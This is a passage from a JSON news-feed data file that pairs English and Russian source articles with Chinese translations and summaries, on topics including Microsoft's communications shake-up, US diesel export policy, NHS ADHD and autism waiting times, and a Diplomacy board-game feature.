Numoto）手中接管传播业务的布拉德·史密斯，通常是微软政策与公司公关的公开代言人。史密斯奔赴全球各地，与政府、监管机构和微软客户会面。目前尚不清楚谁将在今年晚些时候正式接替肖的职位，但微软正在物色内部和外部候选人。\n\n以下是萨提亚·纳德拉的备忘录全文：\n\n传播业务对微软而言从未像现在这样重要。公司在变，我们的行业在变，我们周围的世界也在变。在日益碎片化且比以往任何时候都更加嘈杂的媒体环境中，我们需要继续立足于我们的使命，日积月累赢得信任，并寻找新方式与所有利益相关群体直接建立连接。\n\n我首先要感谢弗兰克为微软所做的一切。在过去的17年多时间里，他为公司以及我们的传播职能做出了巨大贡献。在公司最重要的关头，他一直是领导团队以及我个人的重要智囊。\n\n在弗兰克准备开启人生下一篇章之际，沼本健、布拉德和我一直在讨论公司传播职能的演变。我已要求布拉德自即日起领导传播职能。很少有领导者能像布拉德那样真实地代表微软的声音。他对我们的业务有着深刻的理解，与利益相关者保持着紧密的联系，并且拥有难能可贵的能力，能够以清晰、坚定和令人信服的方式传达复杂的理念。\n\n在此过渡期间，布伦特·科尔伯恩将继续向布拉德汇报，并出任我们的临时传播主管。传播领导团队将向布伦特汇报，弗兰克将继续就过渡事宜为布拉德和布伦特提供建议。\n\n在许多方面，最贴近具体工作的人最有机会塑造外界对微软的认知。我们需要为全公司的人员提供工具和支持，帮助他们把这件事做好。我非常振奋能有机会帮助我们的工程师、销售人员、合作伙伴以及其他最贴近产品和客户的人员，在统一战略和原则指引下，在讲述微软故事的过程中发挥更大作用。你们每个人在实现这一目标的过程中都扮演着至关重要的角色。\n\n接下来我们将迎来一个激动人心的秋季，不仅有诸多重要时刻和活动，背后还有强大的营销支持。这是一个真正契机，可以以全新的方式将我们的产品故事、营销和传播融合在一起。\n\n我们将学习、尝试并不断演进。我们需要从根本上重新审视传播方式，而这个团队将在构建这种新模式中发挥核心作用。\n\n感谢你们为微软所做的一切，也感谢你们在讲述我们故事中各自扮演的角色。\n\n每日免费获取最重要的新闻摘要。\n这是原生广告的标题",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 20,
+        "translationParagraphs": 16,
+        "keyTakeaways": [
+          "来源叙事重点：聚焦微软将通信部门从营销体系转入企业、外部事务与法律事务（CELA）体系，以及布拉德·史密斯暂时负责通信、弗兰克·肖即将离任的组织调整。报道同时将纳德拉所称的“媒体环境日益碎片化和嘈杂”、让工程师和产品相关人员更多参与叙事，与OpenAI、Anthropic等人工智能公司的传播方式联系起来，暗示微软正在探索更直接、更由产品和技术人员参与的企业传播模式。文中关于“意外变化”、与AI初创公司相似等表述属于报道框架或分析，不等同于微软已明确宣布的战略结论。"
+        ],
+        "citations": [
+          {
+            "source": "The Verge (前沿数码科技)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T22:08:22.000Z",
+            "url": "https://www.theverge.com/news/1000374/microsoft-comms-pr-brad-smith-cela"
+          }
+        ]
+      },
+      {
+        "id": "story-xed-rate-surges-aa202464-f3b93b5f1ae9f2d2",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "8% mortgage rates are ‘not an impossibility’ as the 30-year fixed rate surges",
+        "source": "MarketWatch Top Stories (市场观察)",
+        "sourceSlug": "marketwatch",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:03:00.000Z",
+        "pubTime": "2026-09-25 06:03",
+        "url": "https://www.marketwatch.com/story/8-mortgage-rates-are-not-an-impossibility-as-the-30-year-fixed-rate-surges-aa202464?mod=mw_rss_topstories",
+        "imageUrl": null,
+        "fullContent": "With the 10-year Treasury up sharply and the outlook for the U.S. economy looking unclear, some say 8% mortgage rates are back on the table.",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "short-source",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 1,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【MarketWatch Top Stories (市场观察)】于 2026-09-25 06:03 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "MarketWatch Top Stories (市场观察)",
+            "url": "https://www.marketwatch.com/story/8-mortgage-rates-are-not-an-impossibility-as-the-30-year-fixed-rate-surges-aa202464?mod=mw_rss_topstories",
+            "publishedAt": "2026-09-24T22:03:00.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-ars-for-autism-diagnosis-a865f7788037e062",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "‘Her mental health deteriorated’: family forced to wait years for autism diagnosis",
+        "source": "The Guardian Society (卫报社会与民生)",
+        "sourceSlug": "guardian",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:08:52.000Z",
+        "pubTime": "2026-09-25 05:08",
+        "url": "https://www.theguardian.com/society/2026/sep/24/her-mental-health-deteriorated-family-forced-to-wait-years-for-autism-diagnosis",
+        "imageUrl": "https://i.guim.co.uk/img/media/fd5bd10a43cee025a44ab3f576aed72b500058a0/213_0_3781_3024/master/3781.jpg?width=140&quality=85&auto=format&fit=max&s=8bd72041ca1f99999b83a7657d31bce9",
+        "fullContent": "A mother describes the frustration of endless waiting lists and difficulties getting appointments so her teenage daughter can get the help she requires\n\nFor Rosalyn, the battle for an official autism diagnosis for her 14-year-old daughter, Imogen, has been intense, deeply frustrating and has lasted five and a half years.\n\nThat Rosalyn has three other children who have autism diagnoses meant she was acutely aware of the signs.",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-body",
+        "contentParagraphs": 3,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "Rosalyn 为其 14 岁的女儿 Imogen 争取自闭症官方诊断的过程持续了五年半。",
+          "Rosalyn 的另外三个孩子也确诊了自闭症。",
+          "来源叙事重点：以Rosalyn为女儿Imogen争取自闭症正式诊断的长期经历为核心，突出等待名单漫长、预约困难以及由此产生的挫败感，并将家庭已有三名自闭症确诊子女这一背景作为母亲识别相关迹象和持续寻求诊断的依据。标题提到女儿心理健康恶化，但现有正文片段未提供具体事实细节。"
+        ],
+        "citations": [
+          {
+            "source": "The Guardian Society (卫报社会与民生)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:08:52.000Z",
+            "url": "https://www.theguardian.com/society/2026/sep/24/her-mental-health-deteriorated-family-forced-to-wait-years-for-autism-diagnosis"
+          }
+        ]
+      },
+      {
+        "id": "story-ld-atmosphere-clues-html-6e1814561212d991",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Coolest lava world yet with signs of an atmosphere offers clues to early Earth",
+        "source": "Phys.org (基础物理与技术前沿)",
+        "sourceSlug": "science",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:20:06.000Z",
+        "pubTime": "2026-09-25 06:20",
+        "url": "https://phys.org/news/2026-09-coolest-lava-world-atmosphere-clues.html",
+        "imageUrl": "https://scx1.b-cdn.net/csz/news/tmb/2026/study-led-by-uchicago.jpg",
+        "fullContent": "In the search for extraterrestrial life, it makes sense to first look for rocky planets with an atmosphere, like Earth. Without an atmosphere, a planet can't have surface water. But of the more than 6,300 exoplanets cataloged thus far, the vast majority are not rocky, and only a handful of the rocky worlds appear to have an atmosphere.",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "short-source",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 1,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【Phys.org (基础物理与技术前沿)】于 2026-09-25 06:20 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "Phys.org (基础物理与技术前沿)",
+            "url": "https://phys.org/news/2026-09-coolest-lava-world-atmosphere-clues.html",
+            "publishedAt": "2026-09-24T22:20:06.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-5-moskva-2120141250-html-1657a6d07dd13314",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "ПВО сбила десять БПЛА, летевших на Москву",
+        "source": "RIA Novosti (俄新社官方俄文)",
+        "sourceSlug": "ria",
+        "sourceLang": "ru",
+        "publishedAt": "2026-09-24T22:23:13.000Z",
+        "pubTime": "2026-09-25 06:23",
+        "url": "https://ria.ru/20260925/moskva-2120141250.html",
+        "imageUrl": "https://cdnn21.imgria.ru/images/07ea/03/1d/2083579162_0:0:3072:1728_650x0_80_0_0_0baec50ad166e327155c0b792d83d42b.jpg",
+        "fullContent": "",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "missing",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 0,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【RIA Novosti (俄新社官方俄文)】于 2026-09-25 06:23 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "RIA Novosti (俄新社官方俄文)",
+            "url": "https://ria.ru/20260925/moskva-2120141250.html",
+            "publishedAt": "2026-09-24T22:23:13.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-item-b7a60ac418578a94",
+        "title": "Show HN：Koi.rest —— 看会儿游鱼，找回内心的平静",
+        "originalTitle": "Show HN: Koi.rest – watch some fish and regain your balance",
+        "source": "Hacker News (科技前沿论坛)",
+        "sourceSlug": "hackernews",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:33:03.000Z",
+        "pubTime": "2026-09-25 05:33",
+        "url": "https://koi.rest/",
+        "imageUrl": null,
+        "fullContent": "My name is Paul. I’m a developer, an explorer and I’ve got ADHD. As of the beginning of August, I’m also unemployed. This last part, along with everything else this past year, has caused me a great deal of stress.\n\nWhile our balcony zen garden project is yet to be completed, I had an idea to create a virtual one that everyone can use. It's an idea that, unfortunately, I’ve been postponing for a while now, mostly because I have no fucking idea how to do it as I don’t know JavaScript, and I don't have the capacity to learn it right now. So I let perfect be the enemy of good and, well... just kept the idea to myself.\n\nThen I said \"fuck it\" and used AI to make the thing I really wanted to make. I realized I didn't want \"perfect\". I wanted \"good enough\". I tweaked, added, removed, drew, researched, questioned, tested... I just wasn't the one coding it. So now, instead of occupying my brain, it now lives on the internet for others to enjoy.\n\nYes, there’s something noble about making something entirely on your own, but what good is an idea that just sits in my head? So here I am. I made the thing. The weird, little, quiet koi pond. The silly project of passion. The little corner of the internet to let strangers watch fish quietly, together.\n\nI hope this pond helps you as much as it helped me.\n\nP.S. Yes, I am still looking for a job! If you think you can help, please contact me at\n\nWelcome to the pond — a quiet place to regain your balance koi you see are other people visiting the pond together with you you can stay as long as you'd like",
+        "fullTranslation": "我叫保罗（Paul）。我是一名开发者、探索者，还患有注意力缺陷多动障碍（ADHD）。从八月初开始，我失业了。这一点，再加上过去这一年里发生的林林总总，给我带来了巨大的压力。\n\n在我们家阳台禅意花园项目尚未完工之际，我萌生了一个想法：做一个所有人都能使用的虚拟禅意花园。遗憾的是，这个想法已经被我搁置了一阵子，主要是因为我压根不知道该怎么做——我不会 JavaScript，而且眼下也没有精力去从头学习。于是我让“完美成了优秀的敌人”，好吧……就一直把这个想法藏在心里。\n\n后来我心想“去他的”，借由 AI 做出了我真正想做的东西。我意识到自己想要的不是“完美”，而是“足够好”。我反复微调、增加、删减、绘图、调研、提问、测试……我只是没有亲自编写代码而已。所以现在，它不再只是盘踞在我的脑海里，而是呈现在互联网上供大家享受。\n\n是的，完全凭一己之力做出东西确实有一种崇高感，但一个只停留在脑海里的想法又有什么用呢？所以，我做到了。我把它做了出来。这个古怪、小巧、宁静的锦鲤池。这个源于热忱的傻气小项目。这个让陌生人可以聚在一起静静看鱼的互联网小小角落。\n\n希望这个池塘带给你的帮助，能像它带给我的一样多。\n\n附言：是的，我仍在找工作！如果你觉得能帮上忙，请通过以下方式联系我：\n\n欢迎来到池塘——一个让你重获内心平静的宁静之地。你看到的锦鲤就是其他与你一同造访池塘的人，你想待多久都可以。",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 7,
+        "translationParagraphs": 7,
+        "keyTakeaways": [
+          "开发者 Paul 创建了一个名为 Koi.rest 的虚拟锦鲤池网站，供人们在线静心观赏游鱼。",
+          "Paul 自称患有 ADHD（注意力缺陷多动障碍），并自 8 月初起处于失业状态且正在求职。",
+          "来源叙事重点：叙事重点是：一名自称患有 ADHD、近期失业且承受压力的开发者，在不会 JavaScript、暂时无力系统学习的情况下借助 AI 完成了一个供陌生人共同观看虚拟锦鲤的简单网站。叙事将项目呈现为“够用即可”的个人创作、情绪调节空间和人与人之间的轻量线上共处，并包含求职信息。"
+        ],
+        "citations": [
+          {
+            "source": "Hacker News (科技前沿论坛)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:33:03.000Z",
+            "url": "https://koi.rest/"
+          }
+        ]
+      },
+      {
+        "id": "story-t-lower-fuel-prices-html-591f332ef5d1ac0e",
+        "title": "为何美国禁止柴油出口无法平抑燃料价格",
+        "originalTitle": "Why a U.S. Diesel Export Ban Won’t Lower Fuel Prices",
+        "source": "OilPrice (全球能源与原油大宗)",
+        "sourceSlug": "oilprice",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:00:00.000Z",
+        "pubTime": "2026-09-25 06:00",
+        "url": "https://oilprice.com/Energy/Energy-General/Why-a-US-Diesel-Export-Ban-Wont-Lower-Fuel-Prices.html",
+        "imageUrl": null,
+        "fullContent": "As the national average diesel price soared to a record $6.52 per gallon, the Trump Administration sent mixed signals this week about restricting U.S. diesel exports. The White House has denied that an export ban is in the works, even if President Donald Trump and Treasury Secretary Scott Bessent had hinted at the possibility hours earlier. Rumors and reports of a diesel ban sparked vehement opposition from the U.S. energy and manufacturing industries, while analysts say restricting exports would be a self-defeating exercise that would actually further raise fuel prices in America and undermine the U.S. economic and geopolitical strength. Why Diesel Prices Soared Despite the uptick in flows from the Strait of Hormuz, only 1 million barrels per day bpd out of an estimated up to 10 million bpd outbound flows are refined products, the rest is crude. Refinery capacity is constrained in the Middle East due to Iranian strikes on refineries and the trickle of fuel flows through Hormuz. Then there is also severely restricted capacity in Russia due to Ukrainian drone strikes at Russian refineries. Russia has banned diesel exports until the end of September and is likely to extend the ban through October. Executives at the top U.S. refiners estimate that 7-8 million bpd of petroleum products have been off the market for months, tightening global fuel supply, especially that of diesel. Refining fundamentals are very tight and getting tighter with the issues in Russia and the Middle East, Brian Mandell, Executive Vice President of Marketing & Commercial at Phillips 66, said on the Q2 earnings call in early August. \"We have 7 million barrels a day of refineries down in Asia and the Middle East and another 1.4 million barrels down in Russia. And the refineries, depending on the damage and the ability to get spare parts, are going to take a good long time to get back online,\" the executive added. Global refinery throughputs reached a summer peak of 81.4 million bpd in August, up by 960,000 bpd month on month. But this peak was 4.2 million bpd lower than a year ago, with losses spread across the Middle East, Russia, and crude importing economies in Asia, the International Energy Agency IEA said in its monthly report for September. Why A U.S. Export Ban Would Backfire Amid the global fuel crunch and record-high diesel prices in the U.S., some Republican Senators led by Iowa's Chuck Grassley are calling for a ban on diesel exports as record-high diesel prices are hitting American farmers and truckers. The White House and former oil executive and incumbent Energy Secretary, Chris Wright, ruled out a ban on diesel exports, despite President Trump and Treasury Secretary Bessent entertaining the idea and saying hours earlier that the Administration is reviewing whether a ban is feasible. \"The blunt tool of banning diesel exports definitely doesn't work,\" Wright said on Wednesday. \"If you can't export the diesel that comes out of our refineries, you run out of places to store it, and you have to reduce US refining, which would put upward pressure on gasoline prices and jet fuel prices,\" he added. U.S. business, energy, and manufacturing groups share Secretary Wright's view and urged President Trump to reject the idea of fuel export restrictions in a letter signed by three dozen industry associations including the American Petroleum Institute API, the American Fuel & Petrochemical Manufacturers AFPM, the National Association of Manufacturers, and the U.S. Chamber of Commerce. \"Export bans would lead to less fuel production, tighter supplies, and rising costs for American families, farmers, and truckers,\" the industry groups wrote in the letter. \"We, and indeed virtually every expert in the fuels market, fully agree with Secretaries Wright and Burgum that an export ban would force reductions in refining utilization, increase prices for gasoline and jet fuel, and lead to retaliatory actions from other countries.\" Today, U.S. refineries are producing about 5.3 million bpd of distillate fuel, while domestic demand averages about 3.6 million bpd, AFPM said last week in a brief explainer, \"Why a diesel export ban would backfire\". If exports are banned, refiners cannot stockpile unlimited diesel, and they would be forced to cut production, not only of diesel but also of gasoline, as these fuels are produced together, the fuel manufacturers' association said. \"Less fuel production means tighter supplies and higher prices for both diesel and gasoline,\" it noted. Moreover, U.S. regions depending on fuel imports, such as the Northeast, would face even higher fuel prices for all fuels ahead of winter because a U.S. ban would tighten diesel markets further, the U.S. industry associations said. Last but not least, America could lose its reliable supplier status and risk reducing its energy influence, they added. \"If we pull back, other countries will step in, our influence will shrink, and our adversaries will gain ground. America's energy exports are a source of economic and geopolitical strength,\" the association said in the letter. AFPM last week noted that \"Export bans do not create more fuel for Americans. They reduce U.S. fuel production, put upward pressure on prices, weaken energy security and hand market share to foreign competitors.\" Analysts at Capital Economics summed it all up in the title of their latest analysis, \"US export ban would add fuel to the diesel crisis\". By Tsvetana Paraskova for Oilprice.com",
+        "fullTranslation": "随着全美平均柴油价格飙升至创纪录的每加仑6.52美元，特朗普政府本周在是否限制美国柴油出口的问题上释放出相互矛盾的信号。尽管美国总统唐纳德·特朗普和财政部长斯科特·贝森特（Scott Bessent）在数小时前曾暗示过这种可能性，白宫随后否认正在酝酿出口禁令。有关柴油出口禁令的传言和报道引发了美国能源及制造业界的强烈反对，分析人士也表示，限制出口将是一种适得其反的举措，实际上会进一步推高美国国内燃料价格，并削弱美国在经济和地缘政治上的实力。\n\n柴油价格为何飙升\n\n尽管霍尔木兹海峡的通航流量有所回升，但在估计高达1000万桶/日的出境运输量中，仅有100万桶/日属于成品油，其余均为原油。由于伊朗对炼油厂的袭击以及通过霍尔木兹海峡的燃料运输仅呈细流状态，中东地区的炼油产能受到严重制约。此外，由于乌克兰对俄罗斯炼油厂发动无人机袭击，俄罗斯的产能也受到严重限制。俄罗斯已在9月底前禁止柴油出口，并有可能将禁令延长至10月。美国主要炼油商的高管估计，数月来已有700万至800万桶/日的石油产品撤出市场，从而收紧了全球燃料供应，尤其是柴油供应。\n\n菲利普斯66公司（Phillips 66）负责营销与商业的高级副总裁布莱恩·曼德尔（Brian Mandell）在8月初的第二季度财报电话会议上表示：“由于俄罗斯和中东面临的种种问题，炼油基本面非常紧张，且正变得更加严峻。我们在亚洲和中东有700万桶/日的炼油产能停摆，在俄罗斯还有140万桶/日停摆。视受损情况以及获取零部件的能力而定，这些炼油厂将需要很长一段时间才能恢复运营。”国际能源署（IEA）在9月份的月度报告中表示，8月份全球炼油厂加工量达到了8140万桶/日的夏季峰值，环比增长96万桶/日；但该峰值比去年同期低了420万桶/日，产能损失遍布中东、俄罗斯以及亚洲的原油进口经济体。\n\n为何美国实施出口禁令会适得其反\n\n在全球燃料告急、美国柴油价格创历史新高的背景下，以爱荷华州参议员查克·格拉斯利（Chuck Grassley）为首的部分共和党参议员呼吁禁止柴油出口，因为创纪录的高油价正在重创美国农民和卡车司机。白宫以及前石油高管、现任能源部长克里斯·赖特（Chris Wright）排除了实施柴油出口禁令的可能性，尽管特朗普总统和财政部长贝森特对这一想法持开放态度，并在数小时前表示政府正在评估禁令的可行性。“禁止柴油出口这一生硬的手段绝对行不通，”赖特周三表示，“如果无法出口我们炼油厂产出的柴油，存储空间就会耗尽，就不得不削减美国的炼油开工量，而这会对汽油价格和航空煤油价格带来上涨压力。”\n\n美国商界、能源界和制造业协会支持赖特部长的观点，并在由包括美国石油学会（API）、美国燃油与石化制造商协会（AFPM）、全美制造商协会（NAM）以及美国商会（U.S. Chamber of Commerce）在内的数十家行业协会联名签署的信件中，敦促特朗普总统放弃限制燃料出口的想法。各行业协会在信中写道：“出口禁令将导致燃料产量减少、供应进一步收紧，并推高美国家庭、农民和卡车司机的成本。我们——实际上也包括燃料市场上的几乎所有专家——完全赞同赖特部长和伯古姆（Burgum）部长的看法，即出口禁令将迫使炼油厂降低开工率，推高汽油和航空煤油的价格，并招致其他国家的报复性反制。”\n\nAFPM上周在题为《为何柴油出口禁令会适得其反》的简短说明中表示，目前美国炼油厂每天生产约530万桶馏分燃料，而国内日均需求量约为360万桶。该燃料制造商协会指出，如果禁止出口，炼油厂无法无限期储存柴油，将被迫削减产量，不仅削减柴油产量，还会连带削减汽油产量，因为这些燃料是在同一加工过程中产出的。“燃料产量减少意味着柴油和汽油的供应都将更加紧张，价格也会更高。”\n\n此外，美国各行业协会表示，在入冬之前，依赖燃料进口的美国地区（如东北部）将面临所有燃料价格进一步上涨的局面，因为美国的禁令将进一步收紧全球柴油市场。最后但同样重要的一点是，美国可能会失去其作为可靠供应国的地位，并面临能源影响力下降的风险。协会在信中指出：“如果我们退缩，其他国家就会趁虚而入，我们的影响力将缩水，而我们的对手将扩大地盘。美国的能源出口是经济和地缘政治实力的来源。”AFPM上周强调：“出口禁令不会为美国人创造更多燃料。它们只会减少美国的燃料产量，加大价格上涨压力，削弱能源安全，并将市场份额拱手让给外国竞争对手。”凯投宏观（Capital Economics）的分析师在其最新分析的标题中对此做了最凝练的总结：“美国出口禁令将为柴油危机火上浇油”。\n\n（作者：Tsvetana Paraskova，Oilprice.com）",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 1,
+        "translationParagraphs": 10,
+        "keyTakeaways": [],
+        "citations": [
+          {
+            "source": "OilPrice (全球能源与原油大宗)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T22:00:00.000Z",
+            "url": "https://oilprice.com/Energy/Energy-General/Why-a-US-Diesel-Export-Ban-Wont-Lower-Fuel-Prices.html"
+          }
+        ]
+      },
+      {
+        "id": "story--adhd-autism-assessments-5f3edc09ab843459",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "NHS bodies in England impose two-year minimum wait for ADHD and autism assessments",
+        "source": "The Guardian Society (卫报社会与民生)",
+        "sourceSlug": "guardian",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:00:30.000Z",
+        "pubTime": "2026-09-25 05:00",
+        "url": "https://www.theguardian.com/society/2026/sep/24/nhs-integrated-care-boards-england-two-year-waiting-times-adhd-autism-assessments",
+        "imageUrl": "https://i.guim.co.uk/img/media/f8bf1d8867f33d6a507ea583a29ccb3ef2271128/659_79_3365_2693/master/3365.jpg?width=140&quality=85&auto=format&fit=max&s=f765cef514590fe349830d0244b4c471",
+        "fullContent": "Patient groups decry ‘scandalous’ delays as four integrated care boards take step due to soaring demand for diagnoses\n\nNHS bodies are forcing people with suspected attention deficit hyperactivity disorder and autism to wait at least two years before they can be assessed as they struggle to meet surging demand for diagnoses of neurodiversity.\n\nFour NHS integrated care boards (ICBs) covering large regions of England have adopted the approach because they cannot afford the cost of the number of assessments that people are seeking.",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-body",
+        "contentParagraphs": 3,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "英格兰的 NHS 机构要求疑似患有注意缺陷多动障碍（ADHD）或自闭症的人至少等待两年才能接受评估。",
+          "覆盖英格兰大片地区的四个 NHS 综合护理委员会（ICB）采取了至少两年的等待安排。",
+          "来源叙事重点：聚焦四个英格兰 NHS 综合护理委员会为应对评估需求增加和费用压力，采用至少两年后才能接受 ADHD 或自闭症评估的安排；报道突出患者团体对延误的强烈批评，并将问题呈现为医疗服务可负担性与及时获得诊断之间的冲突。"
+        ],
+        "citations": [
+          {
+            "source": "The Guardian Society (卫报社会与民生)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:00:30.000Z",
+            "url": "https://www.theguardian.com/society/2026/sep/24/nhs-integrated-care-boards-england-two-year-waiting-times-adhd-autism-assessments"
+          }
+        ]
+      },
+      {
+        "id": "story-links-opportunities-html-25dfd717f1cde763",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "New research examines CIA failures, Saudi links and missed opportunities before September 11 attacks",
+        "source": "Phys.org (基础物理与技术前沿)",
+        "sourceSlug": "science",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:20:02.000Z",
+        "pubTime": "2026-09-25 06:20",
+        "url": "https://phys.org/news/2026-09-cia-failures-saudi-links-opportunities.html",
+        "imageUrl": "https://scx1.b-cdn.net/csz/news/tmb/2026/september-11.jpg",
+        "fullContent": "A new study from the University of Bath sheds light on critical U.S. intelligence failures ahead of the 9/11 attacks, including evidence that changes how the CIA's repeated failure to share information with the FBI about two hijackers should be understood.",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "short-source",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 1,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【Phys.org (基础物理与技术前沿)】于 2026-09-25 06:20 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "Phys.org (基础物理与技术前沿)",
+            "url": "https://phys.org/news/2026-09-cia-failures-saudi-links-opportunities.html",
+            "publishedAt": "2026-09-24T22:20:02.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-rezident-2120141088-html-f137747d34359af5",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Президент Ирана заявил о стремлении заключить сделку с США",
+        "source": "RIA Novosti (俄新社官方俄文)",
+        "sourceSlug": "ria",
+        "sourceLang": "ru",
+        "publishedAt": "2026-09-24T22:20:18.000Z",
+        "pubTime": "2026-09-25 06:20",
+        "url": "https://ria.ru/20260925/prezident-2120141088.html",
+        "imageUrl": null,
+        "fullContent": "",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "missing",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 0,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【RIA Novosti (俄新社官方俄文)】于 2026-09-25 06:20 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "RIA Novosti (俄新社官方俄文)",
+            "url": "https://ria.ru/20260925/prezident-2120141088.html",
+            "publishedAt": "2026-09-24T22:20:18.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story--game-of-the-alpha-nerds-a8346c8636e8f4b5",
+        "title": "顶级极客的桌面游戏（2014）",
+        "originalTitle": "The Board Game of the Alpha Nerds (2014)",
+        "source": "Hacker News (科技前沿论坛)",
+        "sourceSlug": "hackernews",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T20:53:39.000Z",
+        "pubTime": "2026-09-25 04:53",
+        "url": "https://grantland.com/features/diplomacy-the-board-game-of-the-alpha-nerds/",
+        "imageUrl": null,
+        "fullContent": "Before Risk, before Dungeons & Dragons, before Magic: The Gathering, there was Diplomacy. One writer enters international competition to play the world-conquering game that redefines what it means to be a geek (and a person).\n\nIt was the summer of 1909. I was on the south coast of Spain. I remember it well because the season was almost over. Peace was within reach, I felt. There had been a vote to end the war, and the English had told me to support it. But the vote needed to be unanimous to pass, and it failed. The Russian, the Italian, they thought the English voted against it and that I had been lied to. Why should I believe them? The English and I had worked together against all of them for years now. Of course they’d want to sow distrust between us. Now time was ticking. I desperately wanted peace. I wasn’t sure my country would survive another couple of years, with or without England’s help. There wouldn’t be another vote until after the fall.\n\n“Will you support my army in Spain this fall?” I asked.\n\n“Nah. That ain’t happenin’,” the Englishman replied. A wave of dread came over me. He intended to betray me.\n\n“How could you do this to me? After everything I’ve done for you.”\n\n“I guess I’m just a hard muthafucka like that.”\n\nAnd with that he walked away, leaving me standing in the hallway, mouth agape. He rejoined the other players at the board, who all stared at me, fury in their eyes. We told you so.\n\nFor the past eight hours I had been in the basement of a dorm in Chapel Hill, North Carolina, playing a board game called Diplomacy along with six other men. Each of us was vying against 80 other people to be crowned the world champion of Diplomacy at the end of the weekend here at Dixiecon.1 One of those men, Brian Ecton, a high school math teacher from Prince George’s County, Maryland, with hair like Katt Williams and a mouth to match, approached me right at the start, sizing me up as a beginner and offering an alliance. He explained exactly how it would work and said we’d share a draw at the end. I had no reason not to agree.\n\nFor the next several hours each of the other players would take turns dragging me aside to explain to me how Brian was manipulating me, how he was going to betray me, how I should betray him first and work with them against Brian. I dismissed them all. After all, who’s to say they wouldn’t betray me as well? I was outmatched in this game. Safer to pick a player and stick with him come what may, I thought. But here I stood, on the verge of elimination, and the other players were pissed. According to them, I could have avoided this if I had listened to them hours ago.\n\n“Don’t you realize that some of us traveled a very long distance to win this 